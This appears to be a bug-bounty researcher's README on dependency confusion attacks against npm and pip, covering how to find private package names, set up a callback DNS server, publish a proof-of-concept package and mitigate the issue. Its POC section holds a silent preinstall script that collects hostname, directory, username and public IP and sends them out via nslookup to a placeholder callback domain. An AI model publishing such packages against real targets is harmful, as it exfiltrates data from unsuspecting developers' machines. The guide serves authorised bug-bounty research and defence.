# All About Dependency Confusion Attack, (Detecting, Finding, Mitigating)

## Table of content:

- [About dependency confusion attack](#about-dependency-confusion-attack)
- [How npm works and understanding package system, version, scope packages, etc.](#how-npm-and-similar-package-system-work-and-understanding-its-structure-and-more)
- [Detecting private package](#detect-private-pip-and-npm-packages)
- [Automation with bash](#automating-with-bash-to-find-private-packages)
- [Manual Hunting](#manual-hunting-to-find-more-packages)
- [Setting up bind9 DNS server](#setting-up-bind9-dns-server)
- [Uploading POC](#uploading-poc)
- [Mitigation](#mitigation)
- [Bounty Transparency](#bounty-transparency)



## About dependency confusion attack:
When you put `pip install -r requirements.txt` in your terminal did you check the package that you currently installing is not in the public repository? Or did someone put a backdoor on this package that you install blindly? How do you trust pypi? Is there anything that can harm your machine which is protected by firewall? 
Well, you might wonder how you can easily get hacked for running this command in your terminal! I'm not going to explain how this occurs, there is a great article about [Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) by [alex birsan](https://twitter.com/alxbrsn)! But I can't resist giving you a simple explanation about the dependency confusion attack! 
Suppose you had a project called `A` which completely depends on react packages as you might hear of some third-party react component packages that are currently used by lots of companies for their development process, (for example `react-router`) which means your current project heavily depends on some third-party module! Now Imagine you got a new job at this company and your previous colleague didn’t tell you about his project but did give you a file called `package.json` with a bunch of js files and you know what to do with that just simple command `npm -i` and You're good to go. But did you know that there might be some private packages that your senior developer didn’t allow you to disclose in public? So what will happen when you put `npm -i` in your terminal if this package is claimed by a malicious actor? Yeah, that's the simple explanation of dependency confusion attack!


## How npm and similar package system work and understanding its structure and more:

npm stands for node package manager which is used for storing your project dependency as public. But npm also allows you to install packages from your local package manager which is private, which means these packages are restricted from public users, just an internal user or specific traffic can install these packages for development purposes! And also these packages didn’t exist in public npm [registry](https://registry.npmjs.com), this works fine until you accidentally forget to mention the install path in your cli file.
but in pip, these are completely different as pip checks for higher versions if put the `--extra-index` flag for your installation, like if you put `--extra-index` when you install pip packages through your terminal eg:`pip install -r requirements.txt --extra-index-url` then pip will first check which repository contains a higher version of this package. if pip sees that your local registry contains a higher version then pip will install this instead of a public one. Now imagine you accidentally leak your private pip package name Through github repo and attacker claim these packages and includes 2000.0.0 as the package version but in your local registry this package version is like 2.0.1 what will happen? well, pip priorities a higher version if you include the `--extra-index-url` flag so pip will install this package from a public instead of a private repository, as pip sees this version is higher than your local version. You can read how pip works in this blog [post](https://realpython.com/what-is-pip/), also if you want to read how the version work in npm please read this [article](https://stackoverflow.com/questions/22343224/whats-the-difference-between-tilde-and-caret-in-package-json).as my research is ongoing on other package system so I can't tell you enough for this! I will add them here.


## Detect private pip and npm packages:

This is so easy for npm normal packages, just visit `https://npmjs.com/package/YOUR-PACKAGE-NAME-HERE` and for scope packages, let me tell you what is exactly it means 'if you have seen an npm package name like this `@test/example-packages` that means every package are started with `@` and divided by `\` the first part of `\` is scopes name and the second part is actual packages name so if you found this type of package name in your finding, you have to check whether this scope name is claimed in a public repository or not, for that visit this `https://npmjs.com/org/SCOPE-NAMES-HERE` if this shows you 404 that's means this is unclaimed scope name! So for uploading POC packages on npmjs, you have to create an org name first then update this name to your package.json file like this `@org/package-name-here`, and for pip just [visit](https://pypi.org/)



## Automating with bash to find private packages:

*warning: BE AWARE OF FALSE POSITIVE, CONFIRM YOUR FINDING MANUALLY*

Download this `npm-automation.sh` file and run this command in your terminal `bash automate-bash.sh <target domain>` make sure you have installed [tomnomnom's waybackurls](https://github.com/tomnomnom/waybackurls) and [hacker_'s gau](https://github.com/lc/gau) in your machine.



## Manual hunting to find more packages:

- Using Github:
in GitHub you can visit every repo to see if there is any of these filenames exist, like for npm `package.json`,`yarn.lock`,`package-lock.json`,`yarn-error.log`. For pip `requirements.txt`, `requirement-dev.txt`,`requirement-prod.txt`. 
- Using Devtools:
open your firefox browser and visit your target domain/subdomain ==> right click ==> inspect ==> go to `Debugger` ==> try to find `Webpack` directory (if your target used webpack, otherwise you may not see anything) ==> in `Webpack` directory you will see `node_modules` folder and every subfolder name of `node_modules` folder is actually an npm package.
- JS file:
js file is so boring to read, but if you already know what an npm package name looks like, you may able to spot them within js file. (this needs practice)



## Setting-up bind9 DNS server:
follow these videos and repo
[Github repo](https://github.com/JuxhinDB/OOB-Server)
[DigitalOcean + Namecheap](https://www.youtube.com/watch?v=iMSqT9MZbQs),
[AWS + Godaddy](https://www.youtube.com/watch?v=p8wbebEgtDk),


## Uploading POC:
please follow this [video](https://youtu.be/GJSvEAJeqko) on my youtube channel.

in this folder `src/poc`, edit `index.js` file. replace `niroborg-npm-com-test` with your target package name. also `bind9-or-callback-server.com` to your callback DNS server.
```javascript
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $a.bind9-or-callback-server.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
```
and in `package.json` file, replace `test-npm-com-test` with your target package name. then define the version name. it is recommended that you should upload multiple package versions when you upload the npm package because npm uses a special version system. [read more](https://stackoverflow.com/questions/22343224/whats-the-difference-between-tilde-and-caret-in-package-json)
```json
{
  "name": "test-npm-com-test",
  "version": "1.999.0",
  "description": "",
  "main": "main.js",
  "scripts": {
    "preinstall": "node index.js > /dev/null 2>&1",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "lexi2",
  "license": "ISC",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}

```

## Mitigation:
Scan your project dependency with [confused](https://github.com/visma-prodsec/confused) by [@visma-prodsec](https://github.com/visma-prodsec)

(I have my own scanner just for npm, and I think [confused](https://github.com/visma-prodsec/confused) is really cool as they add a bunch of other package managers for scanning)
## Bounty Transparency:
- $2000 from Shein (goes public)
- $2000 from an outside bug bounty program (closed)
- $1500 from Bugcrowd private program (closed)
- $1250 from Bugcrowd private program (ongoing)
- $1000 from an outside bug bounty(self-hosted)
- $1000 from Comcast Cable. (closed)
- $700 from an outside bug bounty program(self-hosted)
- $500 from an outside bug bounty program(self-hosted)
- $250 from Bugcrowd private program (closed)
## Shoutouts:
- [@alxbrsn](https://twitter.com/alxbrsn) for his amazing [research](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) , without his research, nothing would have been possible.
- [@Stok](https://twitter.com/stokfredrik) for his amazing [video](https://www.youtube.com/watch?v=p8wbebEgtDk) about setting-up bind9 dns server (using GoDaddy + aws)
- [@juxhindb](https://twitter.com/juxhindb) for his amazing github [repo](https://github.com/JuxhinDB/OOB-Server)
- [@nigamelastic](https://twitter.com/nigamelastic) for his amazing [video](https://www.youtube.com/watch?v=iMSqT9MZbQs) about setting-up bind9 dns server(using Namecheap + digitalocean)
- [@tomnomnom](https://twitter.com/tomnomnom) for his powerful archive URL fetching tool [waybackurls](github.com/tomnomnom/waybackurls)
- [@hacker_](https://twitter.com/hacker_) for his powerful archive URL fetching tool [gau](github.com/lc/gau)
- [@visma-prodsec](https://github.com/visma-prodsec) for their powerfull dependency scanner [confused](https://github.com/visma-prodsec/confused)

## Useful?

<a href="https://buymeacoff.ee/x1337loser" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

<a href="https://archive.org/donate">Donate to the InternetArchive</a>
